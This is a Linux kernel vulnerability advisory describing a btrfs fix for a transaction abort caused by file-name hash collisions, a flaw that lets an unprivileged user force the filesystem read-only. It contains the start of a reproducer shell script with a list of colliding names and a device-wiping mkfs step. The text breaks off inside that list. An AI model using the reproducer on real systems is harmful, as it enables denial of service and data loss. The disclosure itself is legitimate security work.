title: "In the Linux kernel, the following vulnerability has been resolved:\n\nbtrfs:
  fix transaction abort on file creation due to name hash collision\n\nIf we attempt
  to create several files with names that result in the same\nhash, we have to pack
  them in same dir item and that has a limit inherent\nto the leaf size. However if
  we reach that limit, we trigger a transaction\nabort and turns the filesystem into
  RO mode. This allows for a malicious\nuser to disrupt a system, without the need
  to have administration\nprivileges/capabilities.\n\nReproducer:\n\n  $ cat exploit-hash-collisions.sh\n\
  \  #!/bin/bash\n\n  DEV=/dev/sdi\n  MNT=/mnt/sdi\n\n  # Use smallest node size to
  make the test faster and require fewer file\n  # names that result in hash collision.\n\
  \  mkfs.btrfs -f --nodesize 4K $DEV\n  mount $DEV $MNT\n\n  # List of names that
  result in the same crc32c hash for btrfs.\n  declare -a names=(\n   'foobar'\n \
  \  '%a8tYkxfGMLWRGr55QSeQc4PBNH9PCLIvR6jZnkDtUUru1t@RouaUe_L:@xGkbO3nCwvLNYeK9vhE628gss:T$yZjZ5l-Nbd6CbC$M=hq"
